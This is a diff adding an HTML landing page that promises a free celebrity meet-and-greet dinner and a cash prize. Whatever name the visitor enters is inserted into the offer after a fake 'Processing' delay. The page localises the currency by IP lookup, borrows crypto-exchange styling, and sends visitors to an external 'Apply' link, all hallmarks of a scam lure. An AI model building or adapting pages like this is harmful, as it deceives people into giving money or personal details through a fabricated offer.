@@ -1,0 +1,562 @@
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta charset="utf-8">   
+
+<title>Celebrity</title>
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 140px;
+    height: 140px;
+    margin: 7px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: DarkGreen  transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value; 
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 2000); // Change delay to 2 seconds
+  }
+</script>
+</head>
+<body>
+
+
+  
+  
+ 
+  <div> 
+  <div class="formbold-form-wrapper">
+
+  <form id="myForm" onsubmit="submitForm(); return false;">
+
+ 
+<p>
+
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCVhV5dQAF_uFaev94cd2k2baOvfogBiADLZgnCVaZi2YF-ccI3fCZbK4&amp;amp;s=10">
+
+ <br>
+
+
+<span style="color: #000000;">
+
+The meet and greet event is back for 2024. Connecting fans with their favorite celebrity singers / actors since 1997.<br><br>
+This is your chance to experience a meet and greet which includes an intimate dinner with your favorite celebrity.
+</span>
+<br>
+ <br>
+</p>  
+
+
+
+
+
+
+<div id="error-message"></div>
+
+<script>
+function validateInput(input) {
+  var minLength = 4;
+  var maxLength = 50;
+  var errorMessage = document.getElementById("error-message");
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "Enter name";
+    input.setCustomValidity("Complete This");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+<div class="formbold-mb-5">
+        <label for="Field1" class="formbold-form-label">   
+       To proceed,  first enter the name of the celebrity you'd like to meet below:
+        </label>
+  <center>
+        <input
+          type="text" 
+          
+          oninput="validateInput(this)"
+          
+          required 
+          name="A_"
+         
+         id="name"
+         
+          placeholder="Enter name of celebrity you'd like to meet"  
+          class="formbold-form-input"
+        />
+
+</center>
+      </div>
+      
+      <br>
+
+      <div><center>
+        <button type="submit" value="Submit"
+       class="formbold-btn w-full">CONTINUE</button></center>
+      </div>
+      
+      
+          <br> <br> 
+
+
+<br><br><br><br>
+
+     <br> 
+<br>
+ 
+    </form></center>
+  </div>
+</div>
+
+
+  
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: "Inter", sans-serif;
+  }
+  .formbold-mb-7 {
+    margin-bottom: 25px;
+  }
+  .formbold-pt-8 {
+    padding-top: 12px;
+  }
+  .formbold-main-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+  }
+
+  .formbold-form-wrapper {
+    margin: 0 auto;
+    max-width: 550px;
+    width: 100%;
+    background: white;
+  }
+  .formbold-form-label {
+    display: block;
+    font-weight: 500;
+    font-size: 18px;
+    color: Black;
+    margin-bottom: 5px;
+  }
+  .formbold-form-label-9 {
+    font-weight: 500;
+    font-size: 18px;
+    margin-bottom: 25px;
+  }
+
+  .formbold-form-input {
+    width: 94%;
+    padding: 16px 21px;
+    border-radius: 2px;
+    border: 2px solid Black;
+    background: white;
+    font-weight: 500;
+    font-size: 17px;
+    color: #000000;
+    outline: none;
+    resize: none;
+  }
+  .formbold-form-input:focus {
+    border-color: Grey;
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold-btn {
+    text-align: center;
+    font-size: 24px;
+    border-radius: 50px;
+    padding: 14px 24px;
+    border: none;
+    font-weight: 500;
+    background-color: #000000;
+    color: white;
+    cursor: pointer;
+  }
+  .formbold-btn:hover {
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold--mx-3 {
+    margin-left: -12px;
+    margin-right: -12px;
+  }
+  .formbold-px-3 {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+  .flex {
+    display: flex;
+  }
+  .flex-wrap {
+    flex-wrap: wrap;
+  }
+  .w-full {
+    width: 96%;
+  }
+
+  .formbold-file-input input {
+    opacity: 0;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+  }
+
+  .formbold-file-input label {
+    position: relative;
+    border: 1px dashed #e0e0e0;
+    border-radius: 6px;
+    min-height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+    text-align: center;
+  }
+  .formbold-drop-file {
+    display: block;
+    font-weight: 600;
+    color: #07074d;
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .formbold-or {
+    font-weight: 500;
+    font-size: 18px;
+    color: #6b7280;
+    display: block;
+    margin-bottom: 8px;
+  }
+  .formbold-browse {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    display: inline-block;
+    padding: 8px 28px;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+  }
+
+  .formbold-file-list {
+    border-radius: 6px;
+    background: #f5f7fb;
+    padding: 16px 32px;
+  }
+
+  .formbold-file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .formbold-file-item button {
+    color: DarkRed;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .formbold-file-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    padding-right: 12px;
+  }
+  .formbold-progress-bar {
+    margin-top: 20px;
+    position: relative;
+    width: 100%;
+    height: 6px;
+    border-radius: 8px;
+    background: #e2e5ef;
+  }
+
+  .formbold-progress {
+    position: absolute;
+    width: 75%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    background: #6a64f1;
+    border-radius: 8px;
+  }
+
+  @media (min-width: 540px) {
+    .sm\:w-half {
+      width: 50%;
+    }
+  }
+</style> 
+  
+
+
+
+
+
+  <div id="processing">
+
+
+
+
+    <h4>
+
+<br><br><br><br><br>
+Processing....
+<br>
+   </strong> 
+</h4> 
+    
+    
+
+
+    <div class="lds-ring">
+      <div></div>
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </div>
+  
+
+
+
+  <div id="mainContent">
+
+
+
+
+
+   
+<html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script>
+
+
+<meta charset=utf-8>
+
+
+
+<meta content="width=device-width, initial-scale=1.0" name=viewport>
+
+
+
+
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+<body class="default home light" style="position: unset;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
+
+
+
+
+
+
+
+
+
+
+
+<h4>
+<strong>
+
+
+<span class="submittedName"></span>
+
+
+</strong>
+</h4>
+
+
+
+ </div>
+ 
+</header> 
+    
+  
+
+ <section id=layout-content tabindex=-1><section class="default uk-padding-remove-bottom uk-section"><div class=uk-container><div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid=""><div class=default><section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m"><div class=module-text__content>
+
+
+
+
+
+
+
+<h6>
+
+
+
+<script>
+  async function convertCurrency() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      const country = data.country_code;
+
+      const currencySymbolElements = document.getElementsByClassName('currency-symbol');
+
+      if (country === 'GB') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '£';
+        });
+      } else if (country === 'DE' || country === 'FR' || country === 'ES' || country === 'NL') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '€';
+        });
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  }
+  
+  document.addEventListener('DOMContentLoaded', convertCurrency);
+</script> 
+
+
+<font size="+1">
+
+You can now register for the <span class="submittedName"></span>
+  meet and greet for a chance to experience  an intimate dinner with <span class="submittedName"></span>. For the first time in the meet and greet program's history, winners will also stand a chance to win a cash prize ranging from <span class="currency-symbol">$</span>200 to  <span class="currency-symbol">$</span>3,000. And the best part? It's all completely free
+<br><br>
+Tap on Learn More to learn more about how you can register for a chance to win an intimate  dinner with <span class="submittedName"></span>
+
+</font>
+
+
+<br><br>
+
+<a href="https://enjoy-org.github.io/Apply/">
+
+<button style="width: 100%; height: 49px; border: 0px solid #000; border-radius: 30px; background-color: #000000; color: #ffffff; font-size: 18px; font-weight: bold; cursor: pointer;">
+
+Learn More
+
+</button>
+
+</a>
+
+
+<br>
+
+<br><br><br><br><br>
+<br><br><br><br><br>
+
+
+
+
+
+
+
+
+
+
+ </section> <section class="footer__navbar footer__navbar--sm footer__navbar__gradient"><div class=uk-container><div class=uk-flex-between uk-grid=""><div class="uk-text-center uk-text-right@m uk-width-1-1 uk-width-auto@m">
+
+</path> </symbol></svg>
+
+
+  </div>
+  
+  <script>
+    // Hide the processing message and form initially
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+  </script>
+</body>
+</html>
+
